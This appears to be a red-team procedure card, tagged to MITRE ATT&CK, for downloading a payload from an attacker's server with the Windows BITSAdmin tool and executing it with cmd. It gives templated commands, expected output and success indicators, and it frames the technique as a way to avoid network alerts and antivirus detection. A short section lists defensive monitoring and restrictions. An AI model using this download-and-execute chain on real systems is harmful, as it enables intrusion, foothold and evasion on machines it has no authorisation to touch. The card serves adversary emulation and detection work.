---
id: 84388285-74e7-4a4b-89d7-91e0d4a1f3cf
name: BITSAdmin-Download-and-Execute-Payload
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:27.054029+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Ingress Tool Transfer|T1105 - Ingress Tool Transfer]]'
  - >-
    [[techniques/Command and Scripting Interpreter/T1059.003 - Windows Command
    Shell]]
sub_techniques: []
tags:
  - '[[tags/Bitsadmin]]'
  - '[[tags/Windows - Download and execute methods]]'
commands:
  - '[[commands/bitsadmin-download-file]]'
  - '[[commands/cmd-execute-downloaded-file]]'
platforms:
  - Windows
tools:
  - '[[tools/BITSAdmin]]'
validated: true
---

# BITSAdmin-Download-and-Execute-Payload

## Summary

This procedure uses the built-in Windows BITSAdmin tool to download a malicious payload from a remote URL to a temporary location on the target system and then execute it. BITSAdmin manages Background Intelligent Transfer Service (BITS) jobs, allowing asynchronous file transfers that blend with legitimate system activity, making it useful for evading detection during initial payload delivery in lateral movement or command and control scenarios.

## Description

BITSAdmin is a command-line utility for creating and managing BITS jobs, which handle file transfers in the background using idle bandwidth. In offensive security operations, attackers leverage BITSAdmin to download executables, scripts, or other payloads from attacker-controlled servers without triggering obvious network alerts, as BITS traffic mimics Windows Update or other legitimate downloads. Once downloaded, the payload is executed using native Windows commands to establish persistence, execute further commands, or perform data exfiltration. This technique targets Windows environments (Vista and later) and requires only command-line access, no additional tools. It maps to MITRE ATT&CK for ingress of tools and execution via command shell, commonly used in red team engagements to simulate advanced persistent threats.

## Requirements

1. Command-line access (cmd.exe or PowerShell) on a Windows target (Vista or later).
2. Network connectivity to the attacker's hosting server (outbound HTTP/HTTPS allowed).
3. BITS service running (default on Windows; if disabled, procedure fails).
4. Write permissions to a temporary directory like %TEMP% or AppData\Local\Temp.

## Defense

- Monitor BITS job creation and transfers via Windows Event Logs (Microsoft-Windows-Bits-Client/Operational) for unusual URLs or destinations.
- Restrict BITSAdmin execution through Group Policy (Computer Configuration > Administrative Templates > Network > Background Intelligent Transfer Service).
- Implement application whitelisting (e.g., AppLocker) to block unsigned executables from running.
- Network segmentation and proxy inspection to block unauthorized downloads; enable logging for BITS-related traffic.

## Objectives

1. Download a payload from a remote source using a BITS job to avoid detection.
2. Execute the downloaded payload to achieve code execution on the target.
3. Establish a foothold for further post-exploitation activities like persistence or lateral movement.

## Instructions

### Step 1: Download the Payload Using BITSAdmin

**Context**: Create a BITS transfer job to download the malicious executable from the attacker's server to a user-writable temporary location. This step uses idle bandwidth and can resume if interrupted, blending with normal system activity. Specify a job name, URL, and destination path; the job runs asynchronously.

**Command** ([[commands/bitsadmin-download-file]]):
```cmd
bitsadmin /transfer $_JOB_NAME /download /priority normal $_URL $_DESTINATION_PATH
```

> This command initiates the download. Monitor progress with `bitsadmin /list` or `/info $_JOB_NAME`. The job completes when the state shows "Transferred" and errors are absent. If the download fails (e.g., network block), retry or use a different URL.

**Expected Output**:
```
BITS job: $_JOB_NAME
State: TRANSFERRED
...
Bytes Total: [file size]
Bytes Transferred: [file size]
```

### Step 2: Verify Download and Execute the Payload

**Context**: Confirm the file was downloaded successfully by checking the destination path, then execute it using the Windows command shell. This launches the payload, which could be a reverse shell, dropper, or implant. Use `cmd /c` to run it silently; adjust execution method based on payload type (e.g., add arguments if needed).

**Command** ([[commands/cmd-execute-downloaded-file]]):
```cmd
cmd /c "$_DESTINATION_PATH"
```

> Execution spawns the payload process. If the payload requires arguments (e.g., for C2 connection), append them: `cmd /c "$_DESTINATION_PATH $_ARGUMENTS"`. Verify success by checking for new processes (Task Manager or `tasklist`) or network connections.

**Expected Output**:
```
Microsoft Windows [Version 10.0.19041.XXX]
(c) Microsoft Corporation. All rights reserved.

[Payload execution output, e.g., no errors, process starts]
```

**Success Indicators**:
- BITS job status shows "TRANSFERRED" with matching file size at destination.
- No antivirus alerts or access denied errors during download/execution.
- Payload process visible in tasklist or establishes expected callback.
